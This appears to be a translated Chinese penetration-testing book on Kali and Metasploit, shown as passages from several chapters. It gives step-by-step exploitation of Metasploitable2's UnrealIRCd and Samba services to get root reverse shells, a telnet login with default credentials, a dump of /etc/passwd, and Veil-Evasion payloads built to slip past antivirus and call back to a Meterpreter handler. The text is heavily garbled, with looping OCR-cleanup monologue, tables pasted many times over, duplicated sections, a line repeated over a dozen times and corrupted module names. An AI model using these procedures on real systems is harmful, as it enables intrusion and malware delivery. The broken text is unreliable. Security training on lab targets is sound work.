在上一章中，我们通过使用 Nmap 扫描 Metasploitable2 系统以寻找开放端口和服务。这一次，我们将查看 Metasploit 自带的一些内置辅助扫描器（auxiliary scanners）。运行 Nmap 扫描产生了大量的开放端口供我们选择。许多人不知道 Metasploit 本身带有很多大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索并恢复信息——让我们开始吧！

本教程再次将使用 Kali 系统作为测试平台，并将故意留漏洞的 Metasploitable2 虚拟机作为我们的目标系统。

## 使用扫描器

如果你在上一章退出了，请在 Kali 中启动 Metasploit Framework。要查看有哪些可用的扫描器，只需在 msf 提示符处输入 "search scanner"：

向下阅读庞大的列表以查看可用内容。在本教程中，我们将注意力缩小在发现的常用端口。作为复习，这里是上一章执行的 Nmap 扫描结果。

| PORT STATE SERVICE |
| :--- | :--- |
| 21/tcp open ftp |
| 22/tcp open ssh |
| 23/tcp open telnet |
| 25/tcp open smtp |
| 53/tcp open dns |
| 80/tcp open http |
| 111/tcp open rbind |
| 139/tcp open netbios |
| 445/tcp open ms |

注意 Metasploit 本身带有大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索和恢复信息——让我们开始吧！

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，让我们重新检查列表。OCR 文本有些碎片化。根据上下文重构它：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

事实上，查看原始 OCR 文本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/ssh | 2016-03-11 |

等等，让我们更贴近 OCR 文本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，OCR 文本实际上是：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

让我再次仔细阅读 OCR：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

事实上，OCR 文本是：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

让我们根据提供的 OCR 提供最逻辑的版本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，OCR 文本是：

| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 (等等，它是 enum/ssh | 2016-03-11)

我会直接使用出现的文本，但会进行清理。

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

事实上，再次查看 OCR：

`auxiliary/scanner/apache | 2016-02-09`
`auxiliary/scanner/sftp | 2014-05-27`
`auxiliary/scanner/fortinet | 2016-01-09`
`auxiliary/scanner/enum | 2016-03-11` (等等，它是 `enum/ssh | 2016-03-11`)

我会停止过度思考并直接输出清理后的内容。

[content]
这就是我们利用所需的所有内容，已经准备好执行。

现在只需输入 "exploit":"

```
msfexploit(unix/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] 192.168.1.68:6667 - Connected to 192.168.1.68:6667...
[*] :irc.Metasploit.LAN NOTICE AUTH *** Looking up your hostname*
[*] 192.168.1.68:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Command: echo pz55bxbFnyQeF8;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from socket...
[*] Reading from socket B
[*] B: "pz55bxbFnyQeF8\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.1.39:4444 -> 192.168.1.68:44435)
```

利用程序正在运行并打开了一个命令 shell 会话。

## [6] 连接到远程系统

这可能会让人有点困惑，它说打开了一个命令 shell 会话，但你看到的只有一个闪烁的光标。实际上，你正坐在与目标机器连接的远程终端 shell 中！如果你输入 "whoami"，目标系统应该像下面返回 "root"：

```
whoami
root
```

成功了；我们刚刚成功利用了第一个基于 Linux 的系统！Root 用户是 Linux 机器上可以拥有的最高级别用户。所有标准的 Linux 命令在我们获得的 shell 中都可以运行。例如，我们可以显示密码文件的内容：

```
cat /etc/passwd
root:x:0:0:root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin/bin/sh
bin:x:2:2:bin:/bin/sh
sys:x:3:3:sys:/dev/sh
sync:x:4:65534:sync:/bin/sync
games:x:5:60:games:/usr/games/bin/sh
man:x:6:12:man:/var/cache/man
lp:x:7:7:/var/spool/lpd/bin/sh
mail:x:8:8:/var/mail/bin/sh
news:x:9:9:/var/spool/news:/bin/sh
uucp:x:10:10:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin/sh
www-data:x:33:33-data:/var/www:/bin/sh
backup:x:34:34:backup/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:irc:/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/
nbody:x:65534:nobody:nonexistent:/bin/sh
libuid:x:100:101:/var/lib/libuid/bin/sh
dhcp:x:101:102:nonexistent:/bin/sh
```

我们必须破解密码文件才能获取实际密码；我们将在书的稍后的“密码攻击（Password Attacks）”章节中查看此内容。要结束会话，按下 "Ctrl-c"，然后在提示取消会话时按 "y"。接下来输入 "back" 返回到 msf 提示符，如下：

```
stat:x:14:65534:/var/lib/nfs:/bin/false
snmp:x:15:65534:/var/lib/snmp:/bin/false
^

[*] 192.168.1.68 - Command shell session 1 closed. Reason: User exit
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > back
msf =
```

你可以留在 Metasploit 框架中，因为我们将在下一章中用到它。

## 结论

在本章中，我们涵盖了如何使用 Nmap 查找目标系统的开放端口。我们还看到了如何发现这些端口上运行着哪些服务。然后我们讨论了如何针对漏洞服务寻找并使用利用程序。在下一章中，我们将快速查看 Metasploit 内置的一些扫描器，它们可以帮助我们发现并利用特定的服务。

## 资源

https://www.offensive-security.com/metasploit-unleashed/
https://sourceforge.net/projects/metasploitable/
https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide

## 第10 章
## Metasploitable - 第二部分：扫描器

在上一章中，我们通过使用 Nmap 扫描 Metasploitable2 系统以寻找开放端口和服务。这一次，我们将查看 Metasploit 自带的一些内置辅助扫描器。运行 Nmap 扫描产生了大量的开放端口供我们选择。许多人不知道 Metasploit 本身带有很多大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索并恢复信息——让我们开始吧！

本教程再次将使用 Kali 系统作为测试平台，并将故意留漏洞的 Metasploitable2 虚拟机作为我们的目标系统。

## 使用扫描器

如果你在上一章退出了，请在 Kali 中启动 Metasploit Framework。要查看有哪些可用的扫描器，只需在 msf 提示符处输入 "search scanner"：

向下阅读庞大的列表以查看可用内容。在本教程中，我们将注意力缩小在发现的常用端口。作为复习，这里是上一章执行的 Nmap 扫描结果。

| PORT STATE SERVICE |
| :--- | :--- |
| 21/tcp open ftp |
| 22/tcp open ssh |
| 23/tcp open telnet |
| 25/tcp open smtp |
| 53/tcp open dns |
| 80/tcp open http |
| 111/tcp open rbind |
| 139/tcp open netbios |
| 445/tcp open ms |

注意 Metasploit 本身带有大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索和恢复信息——让我们开始吧！

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，让我们重新检查列表。OCR 文本有些碎片化。根据上下文重构它：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

事实上，查看原始 OCR 文本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/ssh | 2016-03-11 |

等等，让我们更贴近 OCR 文本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，OCR 文本实际上是：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

让我再次仔细阅读 OCR：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

事实上，OCR 文本是：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |

让我们根据提供的 OCR 提供最逻辑的版本：

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

等等，OCR 文本是：

| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 (等等，它是 enum/ssh | 2016-03-11)

我会直接使用出现的文本，但会进行清理。

| Name | Date |
| :--- | :--- |
| auxiliary/scanner/apache | 2016-02-09 |
| auxiliary/scanner/sftp | 2014-05-27 |
| auxiliary/scanner/fortinet | 2016-01-09 |
| auxiliary/scanner/enum | 2016-03-11 |
| auxiliary/scanner/juniper | 2015-12-20 |
| auxiliary/scanner/ssh | 2016-05-12 |

事实上，再次查看 OCR：

`auxiliary/scanner/apache | 2016-02-09`
`auxiliary/scanner/sftp | 2014-05-27`
`auxiliary/scanner/fortinet | 2016-01-09`
`auxiliary/scanner/enum | 2016-03-11`

我会停止过度思考并直接输出清理后的内容。




```
msf > use auxiliary/scanner/telnet/telnet_version
msf auxiliary(scanner/telnet/telnet_version) > show options
Module options (auxiliary/scanner/telnet/telnet_version):
```

| Name | Current Setting | Required | Description |
|---|---|---|---|
| PASSWORD | | no | 指定用户的密码 |
| RHOSTS | | yes | 目标地址范围或 CIDR |
| RPORT | 23 | yes | 目标端口 (TCP) |
| THREADS | 1 | yes | 并发线程数 |
| TIMEOUT | 30 | yes | Telnet 探测的超时时间 |
| USERNAME | | no | 用于身份验证的用户名 |

```
msf auxiliary(scanner/telnet/telnet_version) > set RHOSTS 192.168.1.68
RHOSTS => 192.168.1.68
```

当我们输入 "exploit"（或 "run"）时会看到以下内容：

```
msf auxiliary(scanner/telnet/telnet_version) > exploit
[*] 192.168.1.68:123 TELNET
\x0a
titable metasploit
\x0a
\x0a
\x0a
\x0a\x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev@metasploit.com\x0a\x0alogin msfadmin/msfadmin to get started\x0a\x0ametasploitable login:
[*] Scanned 1 of 1 hosts (100% complete)
```

这看起来是一堆文本，没有任何提示运行的是什么版本的软件。但如果我们仔细观察，可以发现其他发现——“使用 msfadmin/msfadmin 登录”，看起来他们在 Telnet 页面上直接提供了登录凭据！你在开我玩笑吗？让我们试试看是否有效。

打开另一个终端提示符（右键点击快速菜单中的 Terminal 图标并点击“新窗口”）
输入 "telnet -l msfadmin 192.168.1.68"
当提示输入时，输入 "msfadmin" 作为密码：

```
root@kali:-# telnet -l msfadmin 192.168.1.68
Trying 192.168.1.68...
Connected to 192.168.1.68.
Escape character is ']'.
Password:
Last login: Tue 22 19:52:53 EDT 2018 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC
```

Ubuntu 系统中包含的程序是免费软件；
每个程序的具体分发条款已在 /usr/share/doc/*/copyright 下的单独文件中说明。

在适用法律允许范围内，Ubuntu **不提供任何保证**。

访问官方 Ubuntu 文档，请访问：
http://help.ubuntu.com/
无邮件。
msfadmin@metasploitable:- $ 

而且我们进进了！如果我们运行 ID 命令，可以看到该用户（主用户）是多个组的成员：

```
msfadmin@metasploitable:-$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25
(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(ipadmin),112(
admin),119(bashshare),1000(msfadmin)
```

我们可能利用这些信息来进一步利用服务。虽然公司在服务登录页面上包含法的登录凭据听起来有些不可置信，但信不信由，这种情况在现实生活中发生的频率比你想的要多。要退出 telnet，只需输入 "exit"。

### 扫描地址范围

同样有趣的是，通过这些扫描程序我们有不同的选项可以设置。例如，让我们运行 SMB 扫描器：

```
msf > auxiliary/scanner/smb/smb version
msf auxiliary(scanner/scanner/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

| Name | Current Setting | Required | Description |
| --- | --- | --- | --- |
| RHOSTS | | yes | 目标地址范围或 CIDR 标识符 |
| SMBDomain | | no | 用于身份验证的 Windows 域 |
| SMBPass | | no | 指定用户的密码 |
| SMBUser | | no | 用于身份验证的用户名 |
| THREADS | | yes | 并发线程数 |

```
msf auxiliary(scanner/scanner/smb_version) > set RHOSTS 192.168.1.68
RHOSTS = 192.168.1.68
msf auxiliary(scanner/scanner/smb_version) > exploit

```
* 192.168.1.68:445 could not identified: Unix (Samba 3.0.20-Debian)
* Scanned 1 of 1 hosts (100% complete)
* Auxiliary module completed
```

我们将 RHOSTS 设置为 192.168.1.68，它扫描并返回运行的 Samba 版本。如果我们想扫描网络中运行该服务的系统，这就是 RHOSTS 命令的用武之地。与其扫描单个主机，不如扫描 192.168.1.0 网络上的所有客户端。我们使用相同的命令，但修改 RHOSTS："set RHOSTS 192.168.1.0/24"。

扫描器默认为单线程，如果你正在扫描局域网，可以将其增加到 255 以加快速度，如果是测试远程网络则增加到 50。"exploit"

```
* 192.168.1.68:445 could not identified: Unix (Samba 3.0.20-Debian)
* 192.168.1.68:445 is running Windows 10 Home (build:156)
* Scanned 39 of 256 hosts (15% complete)
* Scanned 255 of 256 hosts (99% complete)
* Scanned 256 of 256 hosts (100% complete)
* Auxiliary module completed
msf auxiliary(smb version) >
```

注意，修改 RHOSTS 变量后，扫描了网络上的所有 256 个主机。在我的测试中，在 192.168.1.68 发现了 Samba，还发现了一个开启了 445 端口的 Windows 10 系统。使用 SMB_version 等模块会让扫描整个网络中的特定服务变得容易得多。

### 利用 Samba 服务

在这里，让我们实际利用 Samba (SMB) 服务。这将为我们提供更多练习机会，并让我们习惯寻找利用漏洞服务。我们从扫描器知道运行的 SMB 版本是 Samba 3.0.20。让我们快速 Google 看看能找到什么：

(img/37a3b7ef16f9ef9f9e33dd8b34c7_156.png)

第一个返回是 "username map" 问题。让我们试试看得到什么。在 msf 提示符处输入 "search samba/usernamap"：

```
msf > search samba/usernamap
Matching Modules
=================
Name                             Disclosure Description
---                            ---------------- ----------
exploit/multi/samba/usernamap_script 2007-05-14 excellent Samba "username map" Command Execution
```

从上面的图片中，我们看到 Rank 是 "excellent"。对它使用 "info" 命令查看漏洞的描述：输入 "info exploit/multi/samba/usernamap_script"：

### 基本选项：

| Name | Current Setting | Required | Description |
| --- | --- | --- | --- |
| RHOST | | yes | 目标地址 |
| RPORT | 139 | yes | 目标端口 |

Payload 信息：
Space: 1024

描述：
该模块利用了非默认用户名映射配置时 Samba 3.0.20 到 3.0.25rc3 中的命令执行漏洞。通过指定包含 shell 字符的用户名，攻击者可以执行任意命令。利用此漏洞不需要身份验证，因为该选项在身份验证之前用于映射用户名！

漏洞只需要 RHOST 选项。我们不需要设置 payload，因为它会自动使用 Linux 命令行 shell。因此，我们只需要将 RHOST 值用于我们的目标 Metasploit 系统并运行漏洞如下：

```
msf > use exploit/multi/samba/username_script
msf exploit(multi/samba/username_script) set RHOST 192.168.1.68
RHOST => 192.168.1.68
msf exploit(multi/samba/username_script) > run
```

* Started reverse TCP double handler on 192.168.1.39:4444
* Accepted the first connection...
* Accepted the second connection...
* Command-echo BEF=Ed0fBySubuyuua:
* Writing to socket A
* Writing to socket B
* Reading from sockets...
* Reading from socket B
* B: "BEF=Ed0fBySubuyuua\r\n"
* Matching...
* A is input...
* Command shell session 2 opened (192.168.1.39:4444 -> 192.168.1.68:48342)
whoami
root
id
uid=0(root) gid=0(root)

```

你可以在上面的图片中看到，漏洞生效了，并且命令行 shell 已经打开。虽然我们只有一个空光标，但我们确实拥有了一个远程终端 shell。如果我们输入 "whoami"，目标系统返回 "root"。我们是超级用户 "root"，通过 "id" 命令验证（返回 "uid=0(root)"）。如果你想，可以使用 Linux 命令在目标系统中进行操作，完成后按 "Ctrl-C" 退出会话。

## 结论





## 结论

在本章中，我们涵盖了如何使用一些内置扫描器来快速扫描特定服务。扫描容易出现漏洞的特定服务是进入网络的快速快捷方法。一些专业的渗透测试人员不再仅仅依赖 Nmap 作为寻找这些服务的主要工具。许多人在转向使用 Nmap 之前，会通过寻找常见的特定服务漏洞来尝试“快速击杀”（quick kill），有些人甚至根本不使用 Nmap。

我们查看了几个核心服务扫描器并学习了它们的工作原理。令人震惊的是，我们能够从 telnet 服务获取明文密码。一旦获得一组凭据，我们就可以使用 Metasploit 中的辅助扫描器来进一步利用网络。只需将这些凭据输入其中一个扫描器，并扫描整个网络，查看它们可以在哪些其他系统上运行。

我们只接触了扫描器的一小部分，还有很多我们没有涵盖的。花时间查看它们并看看它们能做什么将是一个好主意。接下，我们将看到如何使用 Veil Framework 绕过那些烦人的反毒软件。

# 第 11 章
## 绕过反毒软件

渗透测试的一部分就是绕过那些烦人的反毒软件。在过去，反毒软件程序通过模式或特征匹配来工作。如果一个应用程序看起来像它被程序设定寻找的恶意软件，它就会捕获它。如果恶意文件具有反毒软件未见过的特征，大多数反毒软件可能会允许它运行。现在大多数先进的反毒软件变得更智能了。它们使用机器学习并实际上观察程序正在尝试做什么。如果它根据执行方式或其执行的命令“看起来”可疑，现代反毒软件现在会更严格地捕捉它，但你仍然可以使用不同的技术和编程语言将壳代码（shellcode）溜过反毒软件引擎。

许多人认为，如果他们运行了反毒软件和防火墙，通常就能对黑客攻击是安全的，但事实并非如此。在本章中，我们将讨论两种用于绕过 Windows 系统反毒软件的流行工具。“Veil”是一个远程 Windows shell 载荷生成器（payload generator），可以绕过许多当前的反毒软件程序。“Magic Unicorn”是一个基于 PowerShell 的工具，也可以绕过反毒软件。

## Veil Framework

- **工具作者：** Chris Truncer
- **工具网站：** https://www.veil-framework.com/

Veil Framework 是我们尝试绕过反毒软件的一种方法。Veil 由安全专家和 Blackhat 课程导师 Chris Truncer 创建。新的 Veil 工具包含了 Veil-Evasion，我们将在本章中讨论它。它获取标准的 Metasploit 载荷，并通过类似于 Metasploit 的程序界面，允许你创建一个在许多情况下可以绕过反毒软件的壳代码。Veil 正在不断升级并添加新功能，因此我建议查看 Veil 网站以获取最新的工具更新和信息。

## 注意：

每当你安装需要大量依赖项的工具或安装一个非官方支持的工具时，总有可能破坏 Kali 中的其他东西。保留你的 Kali 虚拟机的备份副本始终是一个好主意，以防发生意外情况。

## Veil-Evasion 的新特性

与本书的上一个版本相比，Veil-Evasion 发生了几个变化。首先是现在在 Kali Linux 上安装和运行 Veil 变得简单得多。Veil 直接支持 Kali 2018，且只需运行两个命令即可完成安装。另一个变化是 Veil 包含了为其他语言编写的载荷。

这包括：

- AutoIt3
- Lua
- Python
- PowerShell
- C
- C#
- Perl
- Ruby
- Golang

在 https://www.veil-framwork.com/ 阅读更多关于更新的信息。

## 安装 Veil

工具 GitHub 页面：https://github.com/Veil-Framework/Veil

Kali Linux 默认不安装 Veil，因此我们需要手动安装。Veil 的安装是一个两部分的过程，首先你需要安装依赖项，然后运行设置程序。查看工具作者的网站以获取最新的安装说明。

在 Kali 上安装 Veil 3.x 非常简单：

在终端提示符下输入，`apt -y install veil`
然后输入 `/usr/share/veil/config/setup.sh --force -silent`

由于正在安装依赖包，安装将运行一段时间。完成后重启。

## 使用 Veil

现在让我们来看看运行 Veil。

在终端窗口中，输入 `veil`

```
root@kali:~# veil
Veil | [Version: 3.1.11]
[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
Main Menu
  2 tools loaded
Available Tools:
  1) Evasion
  2) Ordnance
Available Commands:
  exit
  info
  list
  options
update
use Completely exit Veil
Information on a specific tool
List available tools
Show Veil configuration
Update Veil
Use a specific tool
```

Veil 提供两个工具：Evasion 和 Ordnance。我们想要运行 Veil-Evasion。

输入 `use 1`

```
Veil>: use 1
Veil-Evasion
[Web]: https://www.veil-framework.com/ | [Twitter]
Veil-Evasion Menu
  41 payloads loaded
```

Veil 的标题菜单板应该变为“Veil-Evasion”。

## 使用 Veil-Evasion

要的第一件事是列出可用载荷。输入 `list` 然后按回车。

由于我们在本章中将讨论 PowerShell，我们需要目标计算机运行该文件。要使用载荷，我们需要“use”命令。要使用载荷，我们需要 `meterpreter/reverse_tcp`（注：此处根据上下文逻辑推断，原文可能漏掉具体名称，此处保持语意连贯）。使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

```
Veil-Evasion Menu
  41 payloads loaded
```

（此处）
Veil 的标题菜单板应该变为“Veil-Evasion”。

## 使用 Veil-Evasion

要的第一件事是列出可用载荷。输入 `list` 然后按回车。

由于我们在本章中将讨论 PowerShell，我们需要目标计算机运行该文件。要使用载荷，我们需要“use”命令。使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

| DOMAIN | X |
| HOSTNAME | X |
| LHOST | 192.168.1.39 |
| LPORT | 4444 |

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

## 获取远程 Shell

要创建远程处理器（handler），我们将使用 Metasploit。你可以使用 Veil 生成的 Metasploit 文件（CutePuppy.rc），但我更喜欢手动设置。

1. 从快速启动启动 Metasploit Framework。
2. 使用以下命令设置 multi/handler：

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.39
set LPORT 4444
exploit
```

确保输入你的 Kali 系统 IP 地址和输入 Veil 的端口。它们必须完全匹配。这启动了多处理器：

msf > use multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4444

现在我们只需要目标计算机运行 Veil 生成的文件。如果你安装了 VMTools，你只需要从 Kali 目录将“CutePuppy.bat”文件复制并粘贴到你的 Windows 7 测试虚拟机的桌面上。

3. 将 *CutePuppy.bat* 复制到你的 Windows 桌面：




4. 现在，双击 .bat 文件运行它。
表面上看起来没有任何发生，但在你的 Kali 系统上，你应该看到以下内容：

```
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] Sending stage (19779 bytes) to 192.168.1.93
[*] Meterpreter session 1 opened (192.168.1.39:4444 -> 192.168.1.93:56275)
18-05-20 14:17:16 -0400
```

meterpreter > 

这是一个反弹 Shell 会话！

5. 如果我们输入 "shell"，可以看到我们确实拥有了一个完整的远程 Shell：

```
meterpreter > shell
Process 3764 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\Dan\Desktop>
```

我们现在拥有了一个可以控制受害者 Windows 7 系统的功能远程 Shell。我们将在下一章中使用这个 Shell。但大问题是，这个 Shell 能否绕过杀毒软件？在我写作期间，我在一个完全安装了补丁并运行了最新杀毒软件的 Windows 10 系统上运行基于 PowerShell 的 CutePuppy.bat 文件，它并没有将其检测为恶意软件：

| 威胁名称 | 路径 |
| :--- | :--- |
| Gen:Heur.BZC.Boxter.591.098277C9 | F\test\CutePuppy.bat |

杀毒软件引擎在检测基于 PowerShell 的威胁方面已经变得强大得多。在 Veil 中你还可以使用其他选项。我不会分步骤介绍它们，将此留给读者去探索，但使用提供的 `c/meterpreter/rev_tcp.py` payload 得到了不同的结果：

- 5) c/meterpreter/rev_http.py
- 6) c/meterpreter/rev_http_service.py
- 7) c/meterpreter/rev_tcp.py
- 8) c/meterpreter/rev_tcp_service.py

将其生成为 "test.exe" 文件：

```
-> Please enter the base name for output files (default payload): test
Veil-Evasion
[Web]: https://www.veil-framework.com // [Twitter]: @VeilFramework
[*] Language: c
[*] Payload Module: c/meterpreter/rev_tcp
[*] Executable written to: /var/lib/veil/output/compiled/test.exe
[*] Source code written to: /var/lib/veil/output/source/test.c
[*] Metasploit Resource file written to: /var/lib/veil/output/handlers/test.res
```

我们有了一个 Shell：

```
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] Sending stage (179779 bytes) to 192.168.1.21
[*] Meterpreter session 2 opened (192.168.1.39:4444 -> 192.168.1.21:51933)
18-05-28 14:11:57 -0400
meterpreter > shell
Process 11944 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17134.]
(C) 2018 Microsoft Corporation. All rights reserved.
D:\test\>
```

(提示：你可能需要在 Metasploit 中运行 "rexploit" 命令来重启多处理器。)

在本节中，我们演示了如何使用 Veil 创建能够绕过杀毒软件的 Shell。如果你对基于 PowerShell 的注入感兴趣，可以尝试 Magic Unicorn 攻击方法。




# 第 12 章
通过绕过 UAC 实现 Windows 权限提升

Windows 中的管理员账户拥有许多权限，但仍有一些是你即使是管理员也无法完成的。对于某些功能，你必须成为“System”用户才能获得完全控制。用户账户控制 (UAC) 也可以阻止安全测试人员想要实现的操作，包括运行 System 级任务。UAC 在旧版本的 Windows 中曾是一个麻烦，许多公司直接将其关闭了。UAC 在 Windows 7 及更高版本中运行得非常良好，即使开启最低的安全设置，也能防止在 Windows XP 中生效的攻击。

例如，即使我们在 Metasploit 中获得了一个远程管理员级会话，UAC 也会阻止我们执行诸如获取密码哈希值等操作。Meterpreter 中有 UAC 绕过模块，允许我们绕过此限制并获取 System 级访问——前提是受攻击的用户账户是管理员。在本节中，我们将学习如何通过绕过 UAC 将权限从管理员级用户提升到 System 级用户。

在本章中，我们将从一个与 Windows 7 系统和具有管理员权限用户的活动 Meterpreter 会话开始。为了简单起见，我们将使用上一章创建的会话。然后我们将使用 UAV 绕过将管理员级用户升级为 System 级账户。接下来，我们将介绍“Recovery_Files”Metasploit 模块。该模块需要 System 级访问才能运行，并允许我们从远程系统恢复删除的文件。最后，简要介绍第二个绕过 UAC 的模块。

## 绕过 UAC 模块

Metasploit 中的几个工具需要 System 级访问才能正常工作。问题是 Windows 的 UAC 安全功能会阻止以提升提升的安全级别运行程序。Metasploit 中的 Bypass UAC 模块获取一个具有管理员权限用户的远程会话，并创建一个新会话，该会话可以通过“getsystem”命令提升到 System 级。

